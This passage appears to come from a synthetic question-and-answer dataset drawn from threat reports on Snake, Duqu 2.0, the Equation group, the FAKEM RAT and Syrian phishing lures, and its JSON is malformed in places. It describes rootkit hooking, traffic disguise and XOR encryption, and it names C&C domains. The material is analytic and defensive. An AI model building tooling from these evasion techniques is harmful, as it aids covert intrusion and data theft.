to ask the victim if he had previously served in the Syrian Arab Army (Assad's forces). After getting an affirmative answer, she again went silent.\n2  While we did not see the threat actors deploy Android malware via Skype, they had access to Android malware (see Appendix A) that could have been used in a similar fashion.\n3 https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/windows_pif_create.mspx\nSmall Headline: A REPRESENTATIVE CHAT WITH \"IMAN\"*\nThe target receives an initial contact request from the female avatar. He accepts the request. \"She\" then asks, \"are you using Skype on your phone or your PC?\"\nThe avatar responds with a request for a picture. The target then sends a picture, which the avatar compliments. \"She\" follows up with a request for his age and says her own birthdate. He replies with apparent surprise that they have identical birthdays, though one year off.\nIt probably wasn't a coincidence. His birthday is on his Skype profile, which would have been visible to the threat actor.\nAfter they chatted a bit more, she explained that she is a \"computer engineer working at a programming company in Beirut\" and sends a file that the avatar claims is a picture of her.\nThe target becomes a victim when the picture is opened.\nVery Small Headline: A FAKE SYRIAN OPPOSITION WEBSITE\nThe malware that the Skype avatars and social media profiles encouraged their victims to download shared the same host server as malware distributed through a website (80.241.223.128) purporting to be supportive of the Syrian opposition. The threat actors used this website to target opposition members interested in news about the conflict. Much of the websites' content was scraped from the website of the Syrian American Council, a U.S.-based non-profit that advocates for democracy in Syria. In order to watch videos on this website, the viewer is prompted to download a Flash Player update that is actually malware (see Figure 4 and Figure 5).\nThreat actors also included download prompts for legitimate video chat software bundled with malware.\nFigure 4:\nPrompt to install the malware\nSaving malicious flash installer\nFigure 6: Fake Facebook login page\nVery Small Headline: SOCIAL NETWORKING PROFILES AND FACEBOOK CREDENTIAL PHISHING\nThe fake opposition website also includes what appears to be a matchmaking section (Figure 6) that covertly channels targets toward installing malware. This section of the site contains womens' profiles, each of which is populated with information indicating age, location and interests as well as other personal information. The profiles also contain links to a \"LiveCam ID\" as well as the \"Facebook Profile\" of each woman. Clicking on the \"LiveCam ID\" link directs the user to a download page including Live-Chat-ooVoo-Setup.exe, a malicious bundling of ooVoo (a legitimate program). Clicking on a Facebook profile links to a fake Facebook login page that is actually a phishing page used to collect credentials (Figure 7).\n\nHow did the threat group selectively steal data from the Syrian opposition, and what types of information were particularly targeted?",

    "instruction": "Big Headline: OVERVIEW\nOne of the questions which comes up in the months after big security whitepaper disclosures is: where are they now? In other words, what happened to the operators, tools, and infrastructure which was revealed in the reports, blog-posts, and press interviews.\nDid they continue on as before, did they re-build the disclosed infrastructure and tools, did they go away and get jobs in another line of work?\nIn some cases, the disclosure had little, if any impact on the operation. For example, after the McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group behind this. However, when Mandiant released their APT1 report in 2013, there was a noticeable reduction in activity from the group \u2013 and much of the tools and infrastructure has not been seen since.\nIn the September 2010 issue of Foreign Affairs magazine1 , former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD's classified computer networks. Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control.\nThe article included the now oft-quoted phrase 'digital beachhead' to describe what was undoubtedly a significant compromise of US military systems. Further reports in the press2 kept the story alive in 2011, but since then this threat has received remarkably little attention.\nHowever, the operation behind the attacks has continued with little modification to the tools and techniques, in spite of the widespread attention a few years ago. They use highly sophisticated malware tools to maintain persistent access to their targets. These tools can be used for covert communications in a number of different modes, some of which present significant challenges for traditional security technologies to detect.\nThere are some threats which come and go, whilst there are others which are permanent features of the landscape. In this paper, we describe the tools and techniques of one of the most sophisticated and persistent threats we track. We hope this will help victims identify intrusions and understand their need to improve defences. Cyber security is a collaborative effort \u2013 the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space\n1 (<http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain>)http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain\n2 (<http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617>)http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617\nBig Headline: SNAKE SAMPLES\nIn total we have collected over 100 unique files related to this espionage toolkit. Many of these were submitted to online malware analysis websites by victims and investigators over several years. In many cases the source country information of the submission is available. These allow us to visualise the distribution of countries where this malware has been seen:\nWhilst this view is likely to only be the tip of the iceberg, it does give us an initial insight into the profile of targets for the Snake operations.\nOther useful visualisations of the operations come from the compile timestamps. Below is shown a table with a count of the number of files in our sample set from recent years. Two samples compiled in late January 2014 show that this activity is ongoing.\nPlotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks. The creators of the malware operate a working week, just like any other professional. The single sample in our set which was compiled on a Saturday is an outlier, but doesn't alter the conclusion. Similarly, plotting the hour of the day in which the samples were compiled reveals another human pattern \u2013 the working day. This has been adjusted to UTC+4 to show a possible fit to the operators' local time.\n#Samples compiled per day of the week\n#Samples compiled by hour of the day (adjusted to UTC+4)\nBig Headline: USERMODE-CENTRIC ARCHITECTURE\nThe usermode-centric architecture of Snake is known to have been used from 2011 till 2014, with the most recent sample compiled on January 28, 2014.\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that module for the communications.\nOne of the analysed samples exposed multiple debug messages and source control check-in logs. It is not clear why those messages were allowed in the deployed driver - possibly an operational security lapse. However, they give some insight into the internal structure of the source code.\nFor example, the analysed driver gave away the following source file names:\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\common/loadlib_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\win/loadlib.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libunhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\ntsystem/libhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/hook_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/idthook.c\n\u2022 .\\rk_ntsystem.c\n\u2022 ..\\common\\helpers\\interface_s.c\n\u2022 ..\\k2\\fa_registry.c\n\u2022 ..\\k2\\syshook.c\nThe source control check-in log examples, showing the names of the developers to be 'vlad' and 'gilg':\n\u2022 $Id: snake_config.c 5204 2007-01-04 10:28:19Z vlad $\n\u2022 $Id: mime64.c 12892 2010-06-24 14:31:59Z vlad $\n\u2022 $Id: event.c 14097 2010-11-01 14:46:27Z gilg $\n\u2022 $Id: named_mutex.c 15594 2011-03-18 08:04:09Z gilg $\n\u2022 $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $\n\u2022 $Id: ntsystem.c 19662 2012-07-09 13:17:17Z gilg $\n\u2022 $Id: rw_lock.c 14516 2010-11-29 12:27:33Z gilg $\n\u2022 $Id: rk_bpf.c 14518 2010-11-29 12:28:30Z gilg $\n\u2022 $Id: t_status.c 14478 2010-11-27 12:41:22Z gilg $\nIt also exposed the project name of this particular variant as 'sengoku':\nd:\\proj\\cn\\fa64\\sengoku\\_bin\\sengoku\\win32_debug\\sengoku_Win32.pdb\nNow it's time to execute the driver and see what it does.\nBig Headline: ROOTKIT EXECUTION\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32.  This device is used for userland/kernel communications.\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with  XOR 0xAA applied on top of it, so the driver decrypts it first.\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.\nThe purpose of this DLL is to be injected into the user-mode processes. Some variants of Snake carry the DLL modules that can be installed as a service, to be run within taskhost.exe or services.exe processes.\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n\u2022 ZwCreateThread\n\u2022 ZwCreateUserProcess\n\u2022 ZwShutdownSystem\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect any newly created processes, and restore its driver file in case it gets deleted.\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n\u2022 ZwQuerySystemInformation\n\u2022 ZwQueryInformationProcess\n\u2022 ZwClose\n\u2022 ZwTerminateProcess\nThe driver then watches for all userland processes to see if they load any web pages.\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web servers.\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module into the process that initiated connection (the browser).\nOnce injected, the module initiates polling from one of the hard-coded C&C servers.\nThe purpose of this behaviour is to blend Snake's traffic with the browser traffic, bypassing the firewalls, and keeping a low profile at the same time. By communicating from within a process that also communicates, even a technically savvy user will find it challenging to detect Snake traffic among legitimate traffic.\nThe reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such data as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc. When intercepted with the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular website, such as a news website is open.\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.\nIn order to test Snake's communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was built to generate GET request to a web server running on the analysed system.\nThe tool was named as chrome.exe in order to trigger the malware communications.\n\nBased on the above text, answer a question. What insights can be gained from the compile timestamps and patterns of the Snake malware samples, and how do these patterns reflect the behavior of the malware operators?",
    "output": "The compile timestamps of the Snake malware samples reveal that the malware activity is ongoing, with samples compiled as recently as January 2014. Plotting the day of the week and hour of the day in which the samples were compiled shows a familiar pattern for modern cyber-attacks: the creators of the malware operate during a standard working week and working day. This suggests that the operators follow a professional schedule, similar to legitimate software development teams. Adjusting the timestamps to UTC+4 indicates a possible fit to the operators' local time zone, providing clues about their geographical location and working habits.",

    "instruction": "Very Small Headline: 4.1 Actors in Cyberspace\nIn an international armed conflict, belligerents that qualify as 'combatants' enjoy combatant immunity, meaning they cannot be prosecuted for taking part in hostilities (except\nfor war crimes) and, on capture, have PoW status. These rules also apply during occupation, as in Crimea. Most cyber actors in Crimea were nominally non-state actors, for example the pro-Russian hacker group CyberBerkut. If such a group were an integrated part of Russia's military forces, they would be combatants. If not, they could nevertheless be considered combatants if they were part of an organised armed group, belonging to a party to the conflict, when they fulfil the following conditions: (a) being commanded by a person responsible for his subordinates; (b) having a fixed distinctive sign recognisable at a distance; (c) carrying arms openly; and (d) conducting their operations in accordance with the laws and customs of war.50 These criteria are important to distinguish combatants from civilians. It is unlikely that non-state hacker groups, also those active in the Ukraine crisis, meet all these criteria, especially when they are only 'virtually' organised, only in contact through the internet.\n48 These 'minimum rules' are formulated in Common Article 3 of the Geneva Conventions, and in Additional Protocol II to the Geneva Conventions. The rules laid down in that protocol apply to a conflict within a state that is party to the Protocol between the armed forces of that state and dissident armed forces or organised armed groups that control sufficient territory so 'as to enable them to carry out sustained and concerted military operations', Protocol Additional to the Geneva Conventions of 12 August 1949, and relating to the Protection of Victims of Non-International Armed Conflicts (Protocol II), 8 June 1977, Article 1(1). Ukraine is party to Additional Protocol II, and the separatists do control significant territory.\n49 Ukraine is Party to the Convention on Cybercrime (Budapest, 2001). The Convention aims to harmonise cybercrime legislation and facilitate information exchange and international cooperation in the area of prosecution of cybercrimes. States that are party to the convention are obliged to incorporate certain violations in their national laws: 'illegal access', 'illegal interception', 'data interference', 'system interference', and 'misuse of devices'.\nHackers or hacker groups who are non-combatants are to be regarded civilians. However, if they are 'directly participating in hostilities', they lose their protection as civilians and can be targeted by the opposing party. Three criteria have to be met to be regarded 'civilians directly participating in hostilities.' 51 First, there has to be a certain amount of 'harm'; the 'act must be likely to adversely affect the military operations or military capacity of [the adversary] or [\u2026] to inflict death, injury or destruction on persons or objects protected against direct attack'. 52 Second, there has to be a 'causal connexion' between the acts and the harm inflicted. Third, there has to be a 'belligerent nexus', meaning that the operations must be intended to affect the adversary's military operations. Harm can also be inflicted by cyber operations, and does not necessarily have to include physical damage. In the case of CyberBerkut and other active hacker groups the effects probably did not reach the threshold of 'harm'.\nIn non-international armed conflicts, like in eastern Ukraine, 'combatant immunity' does not exist. Whether or not belligerents \u2013 especially non-state armed groups \u2013 have immunity, will be determined based on domestic law. Certain cyber operations will be illegal based on domestic law. Civilians have protected status, but as in international armed conflicts, when they are 'directly participating in hostilities' they lose that protected status.\nVery Small Headline: 4.2 Information Operations\nDuring the conflict in Ukraine, cyber was mainly used for information warfare and intelligence gathering \u2013 not to damage cyber or critical infrastructure. Irrespective their effects, cyber operations are very often called 'cyber attack.' It is important to note that, in the context of international and non-international armed conflicts, 'attack' has a very specific meaning. 'Attacks means acts of violence against the adversary, whether in offence or in defence.'53 Whether or not an operation qualifies as attack is crucial\nbecause the law imposes prohibitions and restrictions with respect to attacks, for example the prohibition to attack civilians, civilian objects, and medical installations, and the requirement to take precautions before conducting an attack. Not every cyber operation that affects the adversary is an attack. A cyber operation that constitutes an act of violence however, is an attack. The Tallinn Manual defines a 'cyber attack' as 'a cyber operation, whether offensive or defensive, that is reasonably expected to cause injury or death to persons or damage or destruction to objects.'54 This interpretation of the current law restricts 'cyber attacks' to acts that have physical consequences.\n50 Geneva Convention (III), 12 August 1949, Article 4, para A(2).\n51 ICRC Interpretive guidance on the notion of Direct Participation in hostilities under international humanitarian law, May 2009.\n52 ICRC Interpretive guidance, 47.\n53 Protocol Additional to the Geneva Conventions of 12 August 1949, and relating to the Protection of Victims of International Armed Conflicts (Protocol I), 8 June 1977, Article 49(1).\nIf the parties to the conflict in Ukraine would have used cyber to inflict physical damage, injuries, or death, or to support kinetic operations, those cyber operations would be '(cyber) attacks' and subject to the relevant prohibitions and restrictions. Most of the cyber activities in Ukraine however are information operations and do not meet the 'attack' threshold. Information operations, as such, are not directly addressed in the Law of Armed Conflict. Whether they would be in violation of the law basically depends on the content of the message. One example would be disseminating a threatening message with the purpose to spread terror among the civilian population.55 The disruption of elections, that took place in Ukraine, definitely violated domestic law, and when conducted or supported by another state, could also have been a breach of international law, but was not a violation of the Law of Armed Conflict.\nInformation operations, as such, are not directly addressed in the Law of Armed Conflict.\nVery Small Headline: 4.3 Cyber Espionage\nDuring the conflict in Ukraine, cyber means have been used to gather intelligence including Snake, Blackenergy, and Sandworm. Intelligence gathering and espionage are not forbidden by international law. Espionage, in the context of the Law of Armed Conflict, has a narrow scope: it refers to operations that are conducted clandestinely or under false pretences, taking place on territory controlled by the adversary; 'behind enemy lines'. 56 For instance, a close access cyber operation where an agent is gaining access to servers being used by the adversary by feigning a false identity and extracting information by using a thumb drive, could be espionage. An agent captured before reaching his own troops has no PoW status and can be tried as a spy. Gathering intelligence from a distance is not espionage in the meaning of the Law of Armed Conflict.\nSnake, Blackenergy, and Sandworm reportedly have a Russian connection. If Russia \u2013 or another state \u2013 would be actively supporting the separatists in eastern Ukraine by providing intelligence, that would not necessarily 'internationalise' the conflict. Mere operational support does not meet the 'overall control' threshold.57\n54 Tallinn Manual, 106.\n55 Protocol I, Article 51(2), and Protocol II, Article 13(2).\n56 Tallinn Manual, 192-193.\n57 Tallinn Manual, 81.\n\nQ: What distinguishes a 'cyber attack' from other forms of cyber operations in the context of international and non-international armed conflicts, and how does the Tallinn Manual define it?",
    "output": "A: In the context of international and non-international armed conflicts, a 'cyber attack' is distinguished from other forms of cyber operations by its specific meaning as an act of violence against the adversary, whether in offense or defense. The Tallinn Manual defines a 'cyber attack' as 'a cyber operation, whether offensive or defensive, that is reasonably expected to cause injury or death to persons or damage or destruction to objects.'

    "instruction": "Medium Headline: 2.4. Format of the (encrypted) configuration file\nUnder the encryption layer (which is identical in the new and old samples as described in the previous section), the configuration file format of the new Duqu 2.0 samples is very similar to the old Duqu config file format. For an overview, see Figure 5 below.\nThe format is designed to hold key-value pairs. The keys are always 4-byte long, and the values can be of arbitrary size. We believe that the keys are timestamps and the values are configuration entries, although the file format could hold any other similarly structured information (e.g. configurations).\nThe old file format begins with 4 bytes whose value is undefined. In the serialization process, it is read from an uninitialized buffer, and it is ignored in the deserialization process. The new file format does not have such a beginning byte sequence.\nThe main part of the file format is surrounded by 4 signature bytes at the beginning and at the end. The byte sequence in the old Duqu file format is 0x839172FF, and in the new Duqu 2.0 version, it is 0x7749CB4D.\nIn both cases, the next integer indicates the number of entries, followed by the entries themselves.\nEach entry begins with a 4-byte key, and then the value. In the new format, the value always begins with 13 bytes (that can be logically divided into four 4 byte integers and a 1 byte value: 4+4+1+4+4), but in the old format, this is missing. Furthermore, the value contains a variable size part in both formats. This is a length prefixed buffer that can hold arbitrary data.\nIn essence, the only difference between the Duqu and the Duqu 2.0 config file formats is the presence of the undefined 4 bytes at the beginning of the file in the old version, and the presence of the 13 additional value bytes in the new version.\nMedium Headline: 2.5. Logging functions\nWe've identified a characteristic logging function that is present in both Duqu and Duqu 2.0, and is used extensively in the networking (mainly HTTP handling) part of the code. The logging function itself is identical, and the data structure used for storing log entries is very similar.\nThe Duqu version of the data structure has embedded function pointers, while the Duqu 2.0 version uses a virtual function table like structure. The main difference from a C++ virtual function table is that the pointer to the table is the last field of the associated structure instead of the first field (see Figure 6).\nIn general, change in the coding style can be seen all over the code. While Duqu uses object oriented style that is similar, but not identical to what C++ compilers do, Duqu 2.0 moved mainly to \"real\" C++, but there are still deviations from the standard C++ style (like the previously function table).\nBoth the Duqu and Duqu 2.0 avoids storing the messages logged through this function. In both codebase, a \"handle_log_entry\" function is called after creating the log entry structure, but this function throws the object away (frees the memory) and does not print or save it. The authors probably used C/C++ macros to avoid detailed logging in release builds, but in this case we still see the logging function invocation. In this case, the macro was probably placed in the function that should have printed the log message (handle_log_entry), and since this is a virtual function, the compiler could not optimize out the function invocations directly.\nThe logging function is called equal times in the Duqu and the Duqu 2.0 samples, and the invocation is always very similar (see Figure 7). The arguments are usually not strings describing the event directly, but 4 byte magic numbers. The logging function is invoked equal times, and the magic numbers are almost always identical in Duqu and Duqu 2.0.\nSmall Headline: GifServer:\nDuqu has used a very unique user agent string when communicating over HTTP:\nMozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\nIn contrast, Duqu 2.0 chooses user agent string randomly from a large set of often used values listed in Sample 7.\nThe following list shows the browser agent strings found in Duqu 2.0:\nMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\nMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0\nMozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4\nMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0\nMozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\nMozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)\nMozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz\nMozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\nMozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205\nMozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2\nMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11\nMozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\nMozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11\nSample 7 \u201348 Browser agent strings in Duqu 2.0\nMedium Headline: 2.7. DLL imports\nDuqu 2.0 uses more than one method to import functions from DLLs. One of the methods utilizes a hash method to represent function names as 4 byte integers. It iterates through all importable function and finds the one whose function name hash matches the given hash. This hash function uses a magic number. A very similar import method and hash function is used in Duqu and Duqu 2.0 although the magic numbers are different: 0x86F186F1 and 0xB31FB31F. Note that even the inner structure of the magic numbers are similar (2x2 bytes).\nSample 8 \u2013 Hash function used for imports in Duqu and Duqu 2.0\nMedium Headline: 3.1. Detection based on communications\nThe malware can transmit information through HTTP traffic. It is most likely that one or more infected computers can be proxy points towards the attacker, meaning that other infected computers communicate with these proxies. These proxies can act as HTTP or HTTPS servers. For HTTPS, a self signed certificate is created by the malware itself. (Most likely by contacting gpl3.selfsigned.org). The Common Name (CN) field seems to be \"*\" in the created certificate. During data transfer, the malware uses <5 random numbers>.gif for file name and a 843-byte GIF file + additional random bytes. The transmissions may be protected by AES.\nOne possible way to detect such transmission (if cleartext traffic is somehow available) to detect the actual 843-byte GIF file. For the known two samples, this GIF portion was identical.\nThe actual image in hex dump is the following:\nSample 9 \u2013 Hexdump of the actual GIF image\nThe image itself is a small picture, basic color is yellow and there are some orange dots in it:\nSample 10 \u2013 The actual GIF image\nQ: What methods does Duqu 2.0 use to import functions from DLLs, and how do these methods compare to those used in the original Duqu? What are the implications of these methods for malware analysis and detection?",
    "output": "Duqu 2.0 employs multiple methods to import functions from DLLs, one of which involves using a hash method to represent function names as 4-byte integers. This method iterates through all importable functions to find a match based on the hash. Both Duqu and Duqu 2.0 use a similar import method and hash function, but with different magic numbers: 0x86F186F1 for Duqu and 0xB31FB31F for Duqu 2.0. Despite the difference in magic numbers, the inner structure remains similar. These methods make it challenging for analysts to identify the specific functions being imported, thereby complicating the analysis and detection of the malware.",

How many victims are there?\nThe victims of the Equation group were observed in more than 30 countries, including Iran, Russia, Syria, Afghanistan, Kazakhstan, Belgium, Somalia, Hong Kong, Libya, United Arab Emirates, Iraq, Nigeria, Ecuador, Mexico, Malaysia, United States, Sudan, Lebanon, Palestine, France, Germany, Singapore, Qatar, Pakistan, Yemen, Mali, Switzerland, Bangladesh, South Africa, Philippines, United Kingdom, India and Brazil.\nVictims generally fall into the following categories:\n\u2022 Governments and diplomatic institutions\n\u2022 Telecommunication\n\u2022 Aerospace\n\u2022 Energy\n\u2022 Nuclear research\n\u2022 Oil and gas\n\u2022 Military\n\u2022 Nanotechnology\n\u2022 Islamic activists and scholars\n\u2022 Mass media\n\u2022 Transportation\n\u2022 Financial institutions\n\u2022 Companies developing cryptographic technologies\nCombining statistics from KSN and our sinkhole, we counted more than 500 victims worldwide. A lot of infections have been observed on servers, often domain controllers, data warehouses, website hosting and other types of servers. At the same time, the infections have a self-destruct mechanism, so we can assume there were probably tens of thousands of infections around the world throughout the history of the Equation group's operations.\nAs an interesting note, some of the \"patients zero\" of Stuxnet seem to have been infected by the EQUATION group. It is quite possible that the EQUATION group malware was used to deliver the STUXNET payload.\nBig Headline: 13. Have you seen any non-Windows malware from the Equation group?\nAll the malware we have collected so far is designed to work on Microsoft's Windows operating system. However, there are signs that non-Windows malware does exist. For instance, one of the sinkholed C&C domains is currently receiving connections from a large pool of victims in China that appear to be Mac OS X computers (based on the user-agent).\nThe malware callbacks are consistent with the DOUBLEFANTASY schema, which normally injects into the system browser (for instance, Internet Explorer on Windows).\nThe callbacks for the suspected Mac OS X versions have the following user agents:\n\u2022 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17\n\u2022 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\n\u2022 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10\n2013-03-02 \u2013 technicalconsumerreports[.]com/modular/assemble.php?params=YoGKKdExT[snip] cS5kS5t0bvGQyB8miDu+Agn \u2013 detected HEUR:Exploit.Script.Generic\nThis leads us to believe that a Mac OS X version of DOUBLEFANTASY also exists.\nAdditionally, we observed that one of the malicious forum injections, in the form of a PHP script, takes special precautions to show a different type of HTML code to Apple iPhone visitors. Unlike other cases, such as visitors from Jordan, which does not get targeted, iPhone visitors are redirected to the exploit server, suggesting the ability to infect iPhones as well.\n\nWhat evidence suggests that the Equation group has developed non-Windows malware, and how might this influence the approach of cybersecurity professionals in defending against such threats?",
    "output": "Evidence of non-Windows malware from the Equation group includes connections from a large pool of victims in China that appear to be Mac OS X computers, as indicated by the user-agent strings in the callbacks to a sinkholed C&C domain. These callbacks follow the DOUBLEFANTASY schema, which typically injects into system browsers. Additionally, a malicious forum injection script redirects Apple iPhone visitors to an exploit server, suggesting the capability to infect iPhones. This evidence highlights the group's cross-platform capabilities. Cybersecurity professionals should adopt a multi-platform defense strategy, ensuring that security measures are not limited to Windows environments but also cover macOS and iOS systems to effectively defend against sophisticated threat actors like the Equation group.",

    "instruction": "Context: Big Headline: Backdoor\nThe network traffic the malware produces is designed to look like Windows Messenger traffic. Malware of this type were discussed on Twitter, noted by SonicWALL, and found to have been active as far back as September 2009.7 However, it remains unclear if all the attacks that used this malware were connected.\nThe malicious traffic begins with headers similar to actual Windows Messenger traffic:\nMSG 5 N 130\nMIME-Version: 1.0\nHowever, beyond this, you will see that the traffic is not valid Windows Messenger traffic but may be sufficiently disguised as such to escape further scrutiny.\n6 UPX is a free tool that compresses executable files. However, it is commonly used to pack malware files, see  for more details.\nFIGURE 2: Malicious traffic disguised as legitimate Windows Messenger traffic\nFIGURE 3: Legitimate Windows Messenger traffic\nCompared with actual Windows Messenger traffic shown in Figure 3, it is easy to distinguish the malicious traffic shown in Figure 2.\nDuring our investigation of the fake \"Windows Messenger\" RAT, we found another version that attempts to disguise its network traffic as Yahoo! Messenger traffic. The network communication this version uses begins with YMSG, the Yahoo! Messenger traffic header.\nFIGURE 4: Malicious traffic disguised as Yahoo! Messenger traffic\nFIGURE 5: Legitimate Yahoo! Messenger traffic\nHowever, the network traffic shown in Figure 4 does not resemble legitimate Yahoo! Messenger traffic beyond the use of the header, YMSG. Compared with the legitimate Yahoo! Messenger traffic shown in Figure 5, it is easy to distinguish between the two.\nA third version of the FAKEM RAT attempts to disguise the network traffic it produces as HTML. The malicious traffic begins with strings like <html><title>1..56</title><body> or <html><title>12356</title><body>. 8\nThis is a fairly rudimentary disguise and odd because you would expect HTML to be the result of a request to a web server and not as something a client would send to a web server.\nFIGURE 6: Malicious traffic disguised as HTML traffic\nBig Headline: Network Traffic Encryption\nThe network communication between the compromised computer and the RAT controller is encrypted. The encryption is the same across variants and done at the bit level. Each byte is XOR-ed by every letter in the string, YHCRA, and rotated 3 bits to the right after every XOR operation. Encrypting the communication ensures that the suspicious data passed between the compromised host and the attackers cannot be easily viewed in plain text. The communication comes in 1024-byte blobs of data that start with the 32-byte header. It appears that attackers may specify any kind of fake headers within the first 32 bytes in order to disguise the subsequent network traffic.\nThe following bits of information are initially sent by the compromised host when the communication starts:\n\u2022 User name\n\u2022 Computer name\n\u2022 OEM code page identifier\n\u2022 What looks like a campaign code but only for some samples\nThe commands are not preconfigured as the malware relies on the data sent by the server. For instance, when a client receives the command, 0211, this signifies that it should execute the accompanying data in memory.\nThe following are the commands the server issues and their meanings:\n\u2022 0211: Execute code.\n\u2022 0212: Reconnect to receive data.\n\u2022 0213: Sleep, close socket, and reconnect.\n\u2022 0214: Exit.\nTo determine the RAT's capabilities, we allowed the attackers to infiltrate a honeypot computer and captured all of the network traffic it generated. We decrypted the network traffic and determined the commands the attackers used, which include:\n\u2022 CmdMana: Command Manager allows attackers to execute shell commands.\n\u2022 FileMan: File Manager allows the attackers to browse directories.\n\u2022 HostIn: Host Information provides information about the compromised computer.\n\u2022 ProcMan: Process Manager gives attackers access to running processes.\n\u2022 RegMana: Registry Manager gives attackers access to the Windows registry.\n\u2022 Scree: Screen takes a snapshot of the desktop.\n\u2022 ServiceMa: Service Manager allows access to services.\n\u2022 Passwo: Password accesses stored passwords like those saved in Internet Explorer (IE).\n\u2022 UStea: Uploads files from a compromised computer.\nThe Windows Messenger samples we analyzed were clustered into five groups that did not have overlapping linkages. Four of the clusters were relatively small and focused on four different domains:\n\u2022 vcvcvcvc.dyndns.org\n\u2022 zjhao.dtdns.net\n\u2022 avira.suroot.com\n\u2022 *.googmail.com\nThe vcvcvcvc.dyndns.org domain is particularly interesting because we also found it being used as a command-and-control (C&C) server for Protux\u2014a well-known malware family that has been used in many targeted attacks over the years. We also found that the avira.suroot.com domain used as a C&C server for yet another malware family we call \"cxgid.\"\nThe *.googmail.com domain was slightly larger and included names like apple12.crabdance.com and apple12.co.cc. However, the largest cluster revolved around the *.yourturbe.org domain and overlapped with the HTML variant. We also found small clusters of the HTML variant that revolved around the domain, endless.zapto.org, which was downloaded as a second-stage malware by Protux.\nFIGURE 7: FAKEM domains associated with the Windows 